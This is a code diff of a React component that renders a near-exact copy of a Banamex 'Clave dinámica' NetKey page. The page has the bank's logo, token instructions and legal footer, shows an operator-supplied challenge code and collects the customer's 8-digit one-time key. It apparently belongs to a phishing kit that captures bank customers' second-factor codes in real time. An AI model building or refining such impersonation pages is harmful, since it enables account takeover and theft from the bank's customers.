@@ -794,123 +794,139 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           }
         };
         
-        const formatBanamexDate = () => {
-          const now = new Date();
-          const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
-          const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
-          
-          const dayName = days[now.getDay()];
-          const day = now.getDate();
-          const month = months[now.getMonth()];
-          const year = now.getFullYear();
-          const hours = String(now.getHours()).padStart(2, '0');
-          const minutes = String(now.getMinutes()).padStart(2, '0');
-          const seconds = String(now.getSeconds()).padStart(2, '0');
-          
-          return `${dayName} ${day} de ${month} de ${year}, ${hours}:${minutes}:${seconds} Centro de México`;
+        const [currentTime, setCurrentTime] = useState(new Date());
+        
+        useEffect(() => {
+          const timer = setInterval(() => setCurrentTime(new Date()), 1000);
+          return () => clearInterval(timer);
+        }, []);
+        
+        const formatDateTime = (d: Date) => {
+          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+          const pad = (n: number) => n < 10 ? '0'+n : n;
+          const dayName = days[d.getDay()];
+          const day = d.getDate();
+          const month = months[d.getMonth()];
+          const year = d.getFullYear();
+          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
         };
         
         const netkeyContent = (
-          <div className="max-w-[900px] mx-auto px-4 sm:px-7 py-7">
-            {/* Header */}
-            <header className="flex flex-col sm:flex-row items-start sm:items-center gap-4 sm:gap-5 mb-6">
-              <div className="flex items-center gap-3">
-                <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="Banamex logo">
-                  <g fill="#c81f3b">
-                    <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
-                    <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
-                    <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
-                  </g>
-                </svg>
-                <div className="text-xl font-semibold text-[#153e46]">Banamex</div>
-              </div>
-              <div className="sm:ml-auto text-right">
-                <div className="text-sm text-[#2d4b51]" data-testid="datetime-netkey">
-                  {formatBanamexDate()}
+          <div className="bg-white text-[#0b3b43] p-7">
+            <div className="max-w-[900px] mx-auto my-[18px]">
+              {/* Header */}
+              <header className="flex flex-col md:flex-row items-start md:items-center gap-[18px] mb-[22px]">
+                <div className="flex items-center gap-3">
+                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
+                    <g fill="#c81f3b">
+                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                    </g>
+                  </svg>
+                  <div className="text-[20px] font-semibold text-[#153e46]">Banamex</div>
                 </div>
-              </div>
-            </header>
-
-            {/* Main Card */}
-            <div className="bg-gradient-to-r from-[#f7fbfc] to-[#eef6f7] rounded-lg p-6 shadow-[0_6px_18px_rgba(0,0,0,0.08)] border border-[rgba(0,0,0,0.03)]">
-              <h1 className="text-2xl sm:text-3xl font-normal text-[#0b3b43] mb-5 flex items-center gap-3">
-                <span className="text-[#c81f3b]">»</span> Clave dinámica
-              </h1>
-
-              <div className="flex flex-col lg:flex-row gap-5">
-                {/* Left Panel - Instructions */}
-                <div className="flex-1 lg:flex-[1.1] bg-white rounded-md p-5 shadow-[0_3px_8px_rgba(0,0,0,0.04)] min-h-[260px] flex flex-col">
-                  <div className="text-[#133d43] text-sm leading-[1.45] space-y-4">
-                    <p>
-                      Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".
-                    </p>
-                    <p>
-                      Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:
-                    </p>
-                    
-                    <div className="mt-5 font-bold text-[22px] text-[#0b2b2f]" data-testid="challenge-code">
-                      CHALLNG: <span data-testid="challenge-value">{screenData.challenge || '--------'}</span>
-                    </div>
-
-                    <div className="flex-1"></div>
-                    
-                    <div className="mt-3">
-                      <button 
-                        className="px-3 py-2 rounded-md bg-[#fff5f6] text-[#c22f40] border border-[rgba(194,47,64,0.08)] text-sm font-semibold cursor-pointer hover:bg-[#ffe8ea] transition-colors"
-                        type="button"
-                        data-testid="button-cancel-left"
-                      >
-                        Cancelar
-                      </button>
-                    </div>
+                <div className="md:ml-auto text-right">
+                  <div className="text-sm text-[#2d4b51]" data-testid="datetime-netkey">
+                    {formatDateTime(currentTime)}
                   </div>
                 </div>
+              </header>
 
-                {/* Right Panel - Input */}
-                <div className="w-full lg:w-[320px] bg-white rounded-md p-5 shadow-[0_3px_8px_rgba(0,0,0,0.04)] flex flex-col justify-between">
-                  <div>
-                    <p className="mb-3 font-semibold text-[#193b3e] text-sm">
-                      Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
-                    </p>
+              {/* Card */}
+              <div 
+                className="bg-gradient-to-r from-[#f7fbfc] to-[#eef6f7] rounded-lg p-[22px] border border-[rgba(0,0,0,0.03)]"
+                style={{ boxShadow: '0 6px 18px rgba(0,0,0,0.08)' }}
+                role="main"
+              >
+                <h1 className="text-[28px] my-[6px_0_18px] flex items-center gap-3">
+                  » Clave dinámica
+                </h1>
 
-                    <label htmlFor="dinamica" className="block text-[13px] text-[#134142] mb-2">
-                      Clave dinámica
-                    </label>
-                    <Input
-                      id="dinamica"
-                      type="text"
-                      maxLength={8}
-                      value={netkeyResponse}
-                      onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
-                      placeholder="Introduzca la clave dinámica aquí"
-                      className="w-full p-2 rounded-sm border border-[#cfdfe0] text-base"
-                      data-testid="input-netkey-response"
-                    />
+                <div className="flex flex-col lg:flex-row gap-[18px] items-start">
+                  {/* Left Panel */}
+                  <div 
+                    className="bg-white rounded-md p-5 flex-[1.1] lg:mr-[6px] min-h-[260px] flex flex-col"
+                    style={{ boxShadow: '0 3px 8px rgba(0,0,0,0.04)' }}
+                    aria-label="Instrucciones"
+                  >
+                    <div className="text-[#133d43] leading-[1.45] text-sm">
+                      <p className="mb-3">Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
+                      <p className="mb-3">Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
+
+                      <div className="mt-[18px] font-bold text-[22px] text-[#0b2b2f]" data-testid="challenge-code">
+                        CHALLNG: <span data-testid="challenge-value">{screenData.challenge || '--------'}</span>
+                      </div>
+
+                      <div className="flex-1"></div>
+                      
+                      <div className="mt-3 text-[#9aaeb0] text-xs">
+                        <button 
+                          className="px-3 py-2 rounded-md bg-[#fff5f6] text-[#c22f40] border border-[rgba(194,47,64,0.08)] font-semibold text-sm cursor-pointer hover:bg-[#ffe5e8] transition-colors"
+                          type="button"
+                          data-testid="button-cancel-left"
+                        >
+                          Cancelar
+                        </button>
+                      </div>
+                    </div>
                   </div>
 
-                  <div>
-                    <div className="flex gap-3 mt-4 items-center justify-end">
-                      <button 
-                        className="px-5 py-2.5 rounded-[10px] bg-[#fff5f6] text-[#c22f40] border border-[rgba(194,47,64,0.08)] text-sm font-semibold cursor-pointer hover:bg-[#ffe8ea] transition-colors"
-                        type="button"
-                        data-testid="button-cancel"
-                      >
-                        Cancelar
-                      </button>
-                      <button 
-                        className="px-5 py-2.5 rounded-[10px] bg-[#0f3e3f] text-white text-sm font-semibold cursor-pointer shadow-[0_6px_10px_rgba(15,62,63,0.12)] hover:bg-[#0a2d2e] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
-                        onClick={handleNetkeySubmit}
-                        disabled={netkeyResponse.length !== 8}
-                        data-testid="button-continue"
-                      >
-                        Continuar
-                      </button>
+                  {/* Right Panel */}
+                  <div 
+                    className="w-full lg:w-[320px] bg-white rounded-md p-5 flex flex-col justify-between"
+                    style={{ boxShadow: '0 3px 8px rgba(0,0,0,0.04)' }}
+                    aria-label="Campo de clave dinámica"
+                  >
+                    <div>
+                      <p className="m-0 mb-[10px] font-semibold text-[#193b3e] text-sm">
+                        Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
+                      </p>
+
+                      <label htmlFor="dinamica" className="text-[13px] text-[#134142] mb-2 block">
+                        Clave dinámica
+                      </label>
+                      <input
+                        id="dinamica"
+                        type="text"
+                        maxLength={8}
+                        value={netkeyResponse}
+                        onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
+                        placeholder="Introduzca la clave dinámica aquí"
+                        className="p-[9px_10px] rounded-sm border border-[#cfdfe0] text-[15px] w-full box-border"
+                        aria-label="Clave dinámica"
+                        data-testid="input-netkey-response"
+                      />
                     </div>
 
-                    <p className="mt-3 text-[#8b9aa0] text-xs leading-tight">
-                      D.R., © 2025, Banco Nacional de México, S.A., integrante del Grupo Financiero Banamex.
-                      Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
-                    </p>
+                    <div>
+                      <div className="flex gap-3 mt-4 items-center justify-end">
+                        <button 
+                          className="px-[18px] py-[10px] rounded-[10px] bg-[#fff5f6] text-[#c22f40] border border-[rgba(194,47,64,0.08)] font-semibold text-sm cursor-pointer hover:bg-[#ffe5e8] transition-colors"
+                          type="button"
+                          data-testid="button-cancel"
+                        >
+                          Cancelar
+                        </button>
+                        <button 
+                          className="px-[18px] py-[10px] rounded-[10px] bg-[#0f3e3f] text-white font-semibold text-sm cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed hover:bg-[#0a2d2e] transition-colors"
+                          style={{ boxShadow: '0 6px 10px rgba(15,62,63,0.12)' }}
+                          onClick={handleNetkeySubmit}
+                          disabled={netkeyResponse.length !== 8}
+                          type="button"
+                          data-testid="button-continue"
+                        >
+                          Continuar
+                        </button>
+                      </div>
+
+                      <p className="mt-[18px] text-[#8b9aa0] text-xs">
+                        D.R., © 2025, Banco Nacional de México, S.A., integrante del Grupo Financiero Banamex.
+                        Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
+                      </p>
+                    </div>
                   </div>
                 </div>
               </div>
